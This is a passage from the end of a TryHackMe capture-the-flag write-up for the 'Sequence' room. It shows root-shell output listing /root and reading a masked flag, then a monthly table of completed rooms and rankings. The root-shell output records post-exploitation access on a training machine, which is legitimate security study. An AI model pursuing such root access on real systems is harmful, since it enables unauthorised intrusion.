lrwxrwxrwx   1 root root    9 Oct 26  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Oct 26  2020 libx32 -> usr/libx32
drwx------   2 root root  16K Oct 26  2020 lost+found
drwxr-xr-x   2 root root 4.0K Oct 26  2020 media
drwxr-xr-x   2 root root 4.0K Oct 26  2020 mnt
drwxr-xr-x   4 root root 4.0K May 31 15:49 opt
dr-xr-xr-x 202 root root    0 Sep 26 xx:xx proc
drwxr-x---  12 root root 4.0K Jun  4 11:58 root
drwxr-xr-x  30 root root  960 Sep 26 ss:ss run
lrwxrwxrwx   1 root root    8 Oct 26  2020 sbin -> usr/sbin
drwxr-xr-x   9 root root 4.0K May 28 04:11 snap
drwxr-xr-x   2 root root 4.0K Oct 26  2020 srv
dr-xr-xr-x  13 root root    0 Sep 26 xx:xx sys
drwxrwxrwt  19 root root 4.0K Sep 26 20:45 tmp
drwxr-xr-x  15 root root 4.0K Nov 10  2021 usr
drwxr-xr-x  14 root root 4.0K Nov 10  2021 var
# cd root
# ls -lah
total 68K
drwxr-x--- 12 root root 4.0K Jun  4 11:58  .
drwxr-xr-x 19 root root 4.0K Sep 26 xx:xx  ..
lrwxrwxrwx  1 root root    9 Feb  4  2024  .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Dec  5  2019  .bashrc
drwxr-xr-x  3 root root 4.0K Feb  2  2024  .cache
drwx------  3 root root 4.0K Feb  2  2024  .config
drwxr-xr-x  3 root root 4.0K Nov 10  2021  .local
-rw-------  1 root root  131 Jun  4 10:18  .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019  .profile
-rw-r--r--  1 root root   66 Feb  1  2024  .selected_editor
drwx------  2 root root 4.0K Nov 10  2021  .ssh
drwxr-xr-x  2 root root 4.0K Feb  2  2024  bin
-rw-r--r--  1 root root   20 Jun  4 11:58  flag.txt
drwxr-xr-x  3 root root 4.0K Feb  2  2024  lib
drwx------  7 root root 4.0K Feb  2  2024  root
drwx------  4 root root 4.0K Feb  2  2024  share
drwx------  4 root root 4.0K Feb  2  2024  snap
drwx------  3 root root 4.0K Feb  2  2024 '~'
# cat flag.txt
THM{**************}
```

<p>1.3. What is the flag value after logging in as mod?<br>
<code>THM{**************}</code></p>

<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/5ad4e2b6-90f1-440d-a019-32bd6a314bfa"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/e1f69b25-873e-40c7-ab32-a405a4c45c75"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, September</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|26      |Medium 🔗 - <strong>Sequence</strong>  | 508    |     110ᵗʰ    |      4ᵗʰ     |     301ˢᵗ    |     5ᵗʰ    | 127,274  |    977    |    76     |
|25      |Medium 🔗 - Introduction to Honeypots  | 507    |     109ᵗʰ    |      4ᵗʰ     |     305ᵗʰ    |     5ᵗʰ    | 127,214  |    976    |    76     |
|25      |Medium 🔗 - Windows x64 Assembly       | 507    |     109ᵗʰ    |      4ᵗʰ     |     303ʳᵈ    |     5ᵗʰ    | 127,110  |    975    |    76     | 
|25      |Easy 🔗 - Network Secuity Essentials   | 507    |     112ⁿᵈ    |      4ᵗʰ     |     302ⁿᵈ    |     5ᵗʰ    | 126,990  |    974    |    76     | 
|24      |Medium 🔗 - Linux Threat Detection 1   | 506    |     110ᵗʰ    |      4ᵗʰ     |     330ᵗʰ    |     5ᵗʰ    | 126,894  |    973    |    76     | 
|24      |Hard 🚩 - Iron Corp                    | 506    |     111ˢᵗ    |      4ᵗʰ     |     363ʳᵈ    |     5ᵗʰ    | 126,768  |    972    |    76     |    
|23      |Medium 🔗 - Intro to Credential Harvesting|505  |     109ᵗʰ    |      4ᵗʰ     |     346ᵗʰ    |     5ᵗʰ    | 126,768  |    971    |    76     |    
|22      |                                        | 504   |              |      4ᵗʰ     |              |             |         |            |    76     |    
|21      |                                        | 503   |              |      4ᵗʰ     |              |             |         |            |    76     |    
|20      |                                        | 502   |              |      4ᵗʰ     |              |             |         |            |    76     |    
|19      |                                        | 501   |              |      4ᵗʰ     |              |             |         |            |    76     |        
|18      |Easy 🔗 - Detecting Web DDos           | 500    |     106ᵗʰ    |      4ᵗʰ     |     312ⁿᵈ    |     4ᵗʰ    | 126,674  |    970    |    76     |
|17      |Medium 🔗 - DLL Hijacking              | 499    |     106ᵗʰ    |      4ᵗʰ     |     348ᵗʰ    |     7ᵗʰ    | 126,554  |    969    |    75     |
|17      |Medium 🔗 - The Docker Rodeo           | 499    |     106ᵗʰ    |      4ᵗʰ     |     346ᵗʰ    |     7ᵗʰ    | 126,546  |    968    |    75     |
|17      |Easy 🔗 - Linux Logging for SOC        | 499    |     106ᵗʰ    |      4ᵗʰ     |     345ᵗʰ    |     7ᵗʰ    | 126,538  |    967    |    74     |
|16      |Hard 🚩 - TryHack3M: TriCipher Summit  | 498    |     107ᵗʰ    |      4ᵗʰ     |     364ᵗʰ    |     7ᵗʰ    | 126,420  |    966    |    74     |
|16      |Easy 🔗 - Chaining Vulnerabilities     | 498    |     108ᵗʰ    |      5ᵗʰ     |     365ᵗʰ    |     7ᵗʰ    | 126,420  |    965    |    74     |
|15      |Medium 🔗 - AppSec IR                  | 497    |     108ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     7ᵗʰ    | 126,404  |    964    |    74     |
|14      |Hard 🚩 - Misguided Ghosts, in progress| 496    |     108ᵗʰ    |      5ᵗʰ     |     389ᵗʰ    |     6ᵗʰ    | 126,300  |    963    |    74     |
|14      |Hard 🚩 - VulnNet: Endgame             | 496    |     108ᵗʰ    |      5ᵗʰ     |     394ᵗʰ    |     6ᵗʰ    | 126,270  |    963    |    74     |
|13      |Hard 🚩 - Royal Router                 | 495    |     107ᵗʰ    |      5ᵗʰ     |     388ᵗʰ    |     6ᵗʰ    | 126,160  |    962    |    74     |
|13      |Medium 🚩 - Void Execution             | 495    |     107ᵗʰ    |      5ᵗʰ     |     383ʳᵈ    |     6ᵗʰ    | 126,120  |    961    |    73     |
|12      |Easy 🚩 - Invite Only                  | 494    |     110ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     6ᵗʰ    | 126,056  |    960    |    73     |
|12      |Medium 🚩 - Devie                      | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ    |     9ᵗʰ    | 125,606  |    959    |    73     |
|11      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
|11      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
|10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ    |     9ᵗʰ    | 125,428  |    957    |    73     |
|10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ    |     9ᵗʰ    | 125,292  |    956    |    73     |
|9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ    |     9ᵗʰ    | 125,236  |    955    |    73     |
|9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ    |    10ᵗʰ    | 125,146  |    954    |    73     |
|9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ    |    10ᵗʰ    | 125,016  |    953    |    73     |
|8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
|8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
|7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
|7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
|7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
|6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ʳᵈ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
|6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
|6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
|6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
|5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
|5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
|4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
|4       |Medium 🔗 - IP and Domain Threat Intel | 486    |     113ʳᵈ    |	     5ᵗʰ    |     579ᵗʰ     |    10ᵗʰ    | 124,018  |   940     |    73     |
|3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
|2       |Medium 🔗 - Session Forensics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
|1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |

</h6></div><br>

<br>

<p align="center">Global All Time:   110ᵗʰ<br><img width="250px"  src="https://github.com/user-attachments/assets/20449c97-dec1-4ecb-ac76-b9d4f51c3668"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/2a6cc300-4f49-49d8-ba92-184f85fba753"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/571f47f4-748a-42b1-aac9-a26cc39ab687"><br>
                  Global monthly:     301ˢᵗ<br><img width="1200px" src="https://github.com/user-attachments/assets/ef973ab8-eeb0-44e8-8817-73b8ca8e29e9"><br>
                  Brazil monthly:      5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/d9a4dd9c-b46f-453d-9cb8-16af82c7ef23"><br>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
